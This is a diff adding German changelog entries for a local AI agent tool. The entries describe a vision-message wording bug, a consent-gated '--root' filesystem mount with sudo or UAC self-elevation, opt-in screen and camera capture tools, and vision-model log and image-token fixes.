+### v0.63.0 – 2026-09-23 (das Bild wurde angesehen, und die Nachricht sagte im selben Atemzug, es sei nichts zu sagen)
+
+⛔️ **Fund 436, gemeldet vom Projektinhaber.** Im Fenster kam auf „Was
+siehst du auf dem Bild?" die Antwort „Leider kann ich keine Bilder
+sehen", **und danach eine vollständige Beschreibung des Bildes.** Beides
+stimmte, und genau das war das Problem.
+
+**Die Ursache ist eine Namensfalle.** Das Fenster schreibt die
+Anhangzeile **sofort**, denn ein Sehmodell braucht Sekunden bis Minuten
+und ein Fenster, das dabei einfriert, ist ein kaputtes Fenster. Für diese
+Zeile nahm es `Sicht::Nichts` und meinte damit „keine Zeile, die zu
+einem Werkzeugaufruf rät". **`Nichts` sagt aber mehr:** „es ist kein
+Sinnesmodell eingerichtet, über ihren Inhalt ist nichts zu sagen". Die
+Oberfläche hängte die Beschreibung danach an dieselbe Nachricht, und das
+Modell las den ersten Satz zuerst.
+
+⚑ **Behoben mit einer vierten Variante `Sicht::Kommt`**, die **nichts**
+schreibt: Wer gleich die Beschreibung anhängt, braucht keinen Satz, und
+jeder Satz wäre entweder doppelt oder falsch. 📌 **Ein Name, der weniger
+behauptet als sein Text, ist eine Falle**; die neue Variante heisst nach
+dem, was gilt.
+
+⚠️ **Die Konsole war nicht betroffen.** Sie sieht vor dem Schreiben der
+Zeile hin und nimmt dann `Sicht::Angesehen`; nur das Fenster musste die
+Zeile vorziehen.
+
+**Belegt:** eine neue Probe mit Gegenrichtung (ohne Sinnesmodell gehört
+der verneinende Satz genau dorthin), der Zweig mutiert und die Probe
+gefallen.
+
+### v0.62.0 – 2026-09-23 (`--root` besorgt sich die Rechte jetzt selbst, und das System fragt)
+
+**Auf Wunsch des Projektinhabers nachgereicht:** `myelith --root` startet
+sich mit Verwalterrechten neu, ohne eine einzige neue Fremdkiste.
+
+| System | Weg | Folge |
+|---|---|---|
+| Unix | `sudo -- env HOME=… MYELITH_ERHOEHT=1 <exe> --root`, danach `exec` | dasselbe Terminal, derselbe Vordergrundprozess |
+| Windows | `powershell Start-Process -Verb RunAs` | eigenes Fenster, dieser Lauf endet |
+
+⚑ **Die Zustimmung holt das System, nicht dieses Programm.** `sudo` fragt
+nach dem Passwort, die Benutzerkontensteuerung öffnet ihren Dialog. Eine
+eigene Rückfrage davor wäre eine zweite, die nichts prüft.
+
+⚑ **`exec` und nicht `spawn`:** Der erhöhte Lauf soll dasselbe Terminal
+haben und derselbe Vordergrundprozess sein. Ein Elternprozess, der nur
+wartet, fängt ausserdem Strg-C ab, das dem Kind gilt.
+
+⛔️ **`HOME` geht mit, und das ist kein Beiwerk.** `sudo` setzt es sonst
+auf das des Verwalters, und damit läge die Ablage des Agenten unter
+`/var/root`: andere Einstellungen, anderes Modell, andere
+Gesprächsablage. **Der Schalter soll Rechte geben und nicht die Identität
+wechseln.** Gesetzt wird es über `env`, weil das auf jedem System da ist
+und an keiner `sudoers`-Regel hängt; ein `--preserve-env`, das die Regel
+verbietet, liesse `sudo` scheitern und der Mensch sähe eine Meldung über
+eine Einstellung, die er nie angefasst hat. Die eigenen `MYL_`- und
+`INTEGER_LLM_`-Angaben gehen aus demselben Grund mit.
+
+⛔️ **Ein Riegel gegen die Schleife** (`MYELITH_ERHOEHT`): Gelingt die
+Erhöhung und bringt trotzdem keine Rechte, sähe der zweite Lauf dieselbe
+Lage wie der erste und entschiede dasselbe, endlos.
+
+⚑ **Vier Gründe, und jeder wird benannt**, statt nur nicht zu erhöhen:
+schon Verwalter, schon versucht, abgeschaltet (`MYELITH_OHNE_ERHOEHUNG`),
+kein Terminal. ⚠️ **Ohne Terminal wird nicht erhöht**, denn ein Passwort
+kann dort niemand eingeben; der Einhängepunkt wird trotzdem gesetzt und
+die Rechtelage gesagt.
+
+⚑ **`/root` erhöht nicht**, und das bleibt so. Der Befehl fällt mitten in
+eine Sitzung, in der ein Modell geladen ist und ein Gespräch steht; ein
+Neustart würfe beides weg.
+
+⚠️ **Der Windows-Weg ist gebaut und hier nicht erprobt.** Geprüft ist
+sein **Aufruf** (Zitierung eines Pfads mit Leerzeichen, keine leere
+`-ArgumentList`), nicht sein Lauf. Deshalb PowerShell und nicht die
+Win32-Schnittstelle: Die bräuchte rohes FFI oder eine Kiste, und **eine
+Erhöhung ist die falsche Stelle für ungeprüften unsicheren Code.**
+
+**Belegt:** sechs neue Proben (beide Aufrufe, Heimat, Riegel, alle vier
+Gründe, Vorrang des Abschalters), der Riegel mutiert und die Probe
+gefallen, ein Lauf ohne Terminal von Hand nachgesehen.
+
+### v0.61.0 – 2026-09-23 (zwei Häkchen für den Blick, und ein Schalter, der die Grenze ganz aufhebt)
+
+**Die Blickerlaubnis steht jetzt in den Einstellungen unter „Agent"**,
+als zwei Häkchen: „Bildschirm ansehen dürfen" und „Kamera ansehen
+dürfen". Sie sind getrennt, weil ein Bildschirm den Rechner zeigt und
+eine Kamera den Raum.
+
+⚑ **Die Konsole hat beide von Haus aus an** (Festlegung des
+Projektinhabers). **Dieselbe Bauart wie beim Arbeitsverzeichnis:** Die
+Konsole beantwortet eine Frage selbst, die das Fenster als Einstellung
+führt. Wer `myelith` tippt, sitzt davor und sieht jeden Werkzeugaufruf
+über den Schirm laufen; ein Fenster kann offen stehenbleiben.
+
+⚑ **Die Umgebung übersteuert beides, und zwar in beide Richtungen.**
+`Blickbefugnis::fuer` kennt deshalb **drei** Zustände statt zwei: nicht
+gesetzt (die Vorgabe gilt), ausdrückliches Ja, alles andere. Ohne den
+dritten gäbe es in der Konsole keinen Weg, den Blick für einen Lauf
+abzuschalten. ⚠️ „Alles andere" heisst Nein, immer: Ein Tippfehler fällt
+damit auf die sichere Seite, gleich wie die Vorgabe steht.
+
+⛔️ **Neu: `myelith --root` und `/root` hängen das ganze Dateisystem
+ein**, mit Schreibrecht. Auf Unix `/`, unter Windows das Systemlaufwerk.
+
+⚑ **Der Schalter fragt nicht, der Befehl schon.** `--root` tippt ein
+Mensch, bevor das Programm läuft, und das **ist** die Zustimmung;
+`/root` fällt mitten in eine Sitzung, in der ein Modell läuft und ein
+Gespräch steht, und dort ist ein Tippfehler eine Zeile und kein
+Entschluss. Die Rückfrage nennt, was wegfällt, und ihre Vorgabe ist
+**Nein**: leere Eingabe, Abbruch und alles ausser einem ausdrücklichen
+Ja zählen als Nein. ⚠️ **Ohne Terminal wird nicht gefragt und nicht
+eingehängt.** Eine Frage, die niemand liest, ist keine Zustimmung.
+
+⚠️ **Die Rechte kommen vom Start, nicht vom Schalter, und das ist eine
+bewusste Abweichung.** `--root` verschiebt die Einhängegrenze; wieviel
+dahinter erreichbar ist, entscheidet, als wer das Programm läuft. Für
+Verwalterrechte: `sudo myelith --root`. **Ein Programm, das sich selbst
+erhöht, nähme sich Rechte, die beim Start niemand gegeben hat**, und die
+Warnung stünde dann hinter der Erhöhung statt davor. Beide Meldungen
+sagen deshalb, wie die Rechtelage wirklich ist; auf Unix wird sie
+gelesen (`geteuid`), unter Windows steht ausdrücklich „nicht
+feststellbar" statt „nein".
+
+**Belegt:** vier neue Proben in der Konsole (absolute Wurzel, Befehl in
+der Hilfe samt Hinweis auf die Rückfrage, Konsolenvorgabe gegen die
+Fenstervorgabe, Schreibrecht am Wurzelschalter), Clippy und Proben über
+alle vier Client-Kisten grün.
+
+### v0.60.0 – 2026-09-23 (der Agent darf hinsehen, wenn er gefragt wird, und nur dann)
+
+**Zwei neue Werkzeuge:** `bildschirm_ansehen` und `kamera_ansehen`. Sie
+nehmen **jetzt** ein Einzelbild auf und lassen es vom Sehmodell ansehen.
+
+⚑ **Abruf und kein Strom, und das ist gemessen entschieden.** Ein
+laufender Strom wäre die naheliegende Bauform und die falsche: Ein
+Sehdurchgang kostet rund drei Sekunden, das grosse Modell wartet auf der
+Maschine ohnehin auf die Platte, und **vor allem entscheidet die Frage
+über die Antwort.** Auf „wie viele blaue Kreise" kam exakt die Zahl; die
+allgemeine Beschreibung desselben Bildes hat sie nie enthalten. Ein
+Strom erzeugt Beschreibungen, nach denen niemand gefragt hat.
+
+⚑ **Deshalb ist `frage` bei beiden Pflicht** und bei `bild_beschreiben`
+nicht: Ein Bild liegt schon da und lässt sich noch einmal ansehen, ein
+Blick ist ein Augenblick. Die Beschreibung von `bild_beschreiben` ist aus
+demselben Grund neu gefasst; sie sagt dem Modell jetzt, dass es gezielt
+fragen soll, statt nachträglich nachzufragen.
+
+⛔️ **Der Blick ist eine eigene Befugnis und nicht noch ein
+Lesewerkzeug.** Ein Bild anzusehen, das im Arbeitsordner liegt, fasst die
+Einhängegrenze ein. Den Bildschirm oder die Kamera aufzunehmen erzeugt
+etwas, das vorher nicht da war, und zwar aus einem Raum, den keine
+Einhängung begrenzt. **Wer eine Einhängung setzt, hat nicht gesagt, dass
+jemand ins Zimmer sehen darf.** Beide stehen deshalb nur im Angebot, wenn
+sie ausdrücklich scharf gestellt sind (`MYL_BLICK_BILDSCHIRM`,
+`MYL_BLICK_KAMERA`), und getrennt voneinander. ⚠️ Alles, was nicht `1`,
+`ja` oder `an` heisst, gilt als nein: Ein Tippfehler darf die Kamera nicht
+anschalten.
+
+⚑ **Jede Aufnahme bleibt unter `.AGENT/blicke/` liegen**, und ihr Pfad
+steht in der Antwort. Eine Aufnahme, die nur im Speicher existiert, ist
+von aussen nicht nachprüfbar.
+
+**Welches Modell, und warum das eine Messung ist** (2026-09-23): Auf
+einer freigestellten Hand mit einem ausgestreckten Finger antwortete das
+**genaue** Modell „1", das schnelle „5", also die Vorannahme „eine Hand
+hat fünf Finger". Reine Objektzählung können beide (drei, fünf und sieben
+Kreise exakt). ⚑ **Ein Blick, der gezählt werden soll, braucht das
+genaue Modell**, und der Werkzeugweg nimmt es.
+
+**Aufnahme ohne neue Fremdkiste:** Auf macOS `screencapture` (liegt bei,
+kein Format, kein Gerät), sonst `ffmpeg`, das für den Ton ohnehin
+gebraucht wird. Die Kamera holt immer ffmpeg. ⚠️ **Die ersten
+Kamerabilder werden verworfen** (`MYL_KAMERA_VORLAUF`, Vorgabe acht):
+Eine Kamera stellt Belichtung erst im Laufen ein, und das erste Bild ist
+dunkel.
+
+⛔️ **Der Rückgabewert allein trägt die Zusage nicht.** Geprüft wird
+zusätzlich, ob wirklich eine Datei mit Inhalt entstanden ist. 📌 Ohne die
+Freigabe zur Bildschirmaufnahme meldet `screencapture` auf dieser
+Maschine `could not create image from display` und endet mit eins; die
+Meldung nennt deshalb den Weg zur Freigabe.
+
+**Am Bündel:** `NSCameraUsageDescription` ist ergänzt, aus demselben
+Grund wie das Mikrofon. ⚠️ **Für die Bildschirmaufnahme gibt es keinen
+solchen Schlüssel**; sie wird einmal in den Systemeinstellungen
+freigegeben, und macOS merkt sie sich an der Kennung samt Signatur.
+
+⚑ **`myl sinne` nennt beide mit**, und zwar Gerät und Erlaubnis
+getrennt: „Bildschirm ✓ screencapture" neben „Blicken: Bildschirm AUS".
+📌 Am 2026-09-18 standen die Sinneswerkzeuge schon einmal in der Rüstung
+und in keiner Liste; **dieselbe Frage an zwei Orten, und der zweite
+meldet sich nicht.** Wer zwei Haken sieht und die Erlaubniszeile nicht
+liest, sucht den Fehler danach an der falschen Stelle.
+
+**Belegt:** sechs neue Proben im Client (Befugnis in beide Richtungen,
+getrennt je Gerät, Gerät ohne Befugnis, Pflichtfrage, nur ausdrückliches
+Ja) und vier in `myl-senses` (beide Aufnahmewege, Kameravorlauf, Lauf
+ohne Bild). Die Scharfstellung mutiert, die Probe fällt. **264 Proben in
+`myl-client`, 65 in `myl-senses`**, Clippy über alle vier Kisten grün.
+
+### v0.59.2 – 2026-09-22 (ein Bild, das zu gross war, und ein Protokoll, das das falsche Ende behielt)
+
+⛔️ **Gemeldet vom Projektinhaber: Ein Bildschirmfoto von 5,6 MB wurde
+nicht ausgewertet.** Das Sehmodell brach mit Rückgabewert 1 ab, und das
+Sprachmodell antwortete daraufhin, es sei ein reines Textmodell. **Zwei
+Funde, und der erste hat den zweiten verdeckt.**
+
+⛔️ **Fund 433: Das Protokoll behielt den Anfang, gemeldet wurde das
+Ende.** `prozess::laufen` schnitt beide Röhren bei 8 KB ab und behielt
+jeweils den **Anfang**; die Fehlermeldung zeigt aber unter der
+Überschrift „Die letzten Zeilen" die letzten Zeilen dieses Anfangs. Bei
+einem grossen Bild sind das die Fortschrittszeilen der ersten Sekunden.
+📌 **Die Absicht stand die ganze Zeit im Quelltext** („Der Grund steht
+bei llama.cpp am Ende") und die Umsetzung widersprach ihr; **die Ursache
+wurde verworfen, bevor sie entstand.**
+
+⚑ **Behoben je Röhre verschieden, und das ist der Kern:** stdout ist die
+**Antwort**, dort zählt der Anfang; stderr ist das **Protokoll**, dort
+steht der Grund am Ende. Drei Proben halten beide Richtungen fest, dazu
+die Zeichengrenze beim Kürzen von vorn.
+
+⛔️ **Fund 435: Ohne Grenze für die Bildtoken scheitert ein grosses
+Bild.** Nachgestellt mit einem Bild zu 6200 mal 4600 (SmolVLM):
+
+| Grenze | Blöcke | Ergebnis |
+|---|---|---|
+| ohne | 387 | ⛔️ `failed to find a memory slot`, Rückgabewert 1 |
+| ohne, Kontext 32768 | 387 | läuft durch und liefert **Unsinn** |
+| 256 | 7 | gute Beschreibung, Text nur sinngemäss |
+| **1024** | **27** | **gute Beschreibung, Text wörtlich** |
+| 2048 | 55 | fängt an, sich zu wiederholen |
+
+⚑ **Der Aufruf gibt jetzt `--image-max-tokens 1024` mit**
+(`MYL_SEHEN_BILDTOKEN`, null lässt die Option weg). **Die Grenze ist
+keine Sparmassnahme:** Mehr Bildtoken machen die Antwort **schlechter**.
+Schon ein Bild zu 4000 mal 3000 brachte ohne Grenze statt einer
+ausführlichen Beschreibung nur noch einen Satz.
+
+📌 **Und ein grösserer Kontext ist nicht die Abhilfe.** Mit `-c 32768`
+läuft derselbe Lauf durch und gibt Zeichensalat aus. Ein Abbruch, den
+man sieht, ist besser als eine Antwort, die falsch ist; richtig ist
+beides nicht.
+
+Der Kommandoaufbau ist dafür aus `beschreiben` herausgelöst
+(`befehl_fuer`), wie es `sprechen.rs` vormacht: Ein Aufruf, der nur mit
+einem echten Sehprogramm entsteht, wird nie geprüft, denn in der CI
+liegt keines. 42 Proben der Kiste grün, beide Behebungen einzeln
+mutiert, beide Proben fallen.
 
 ### v0.59.1 – 2026-09-22 (der Denkblock, der nie geöffnet wurde, weil die Aufforderung ihn schon offen hielt)
 
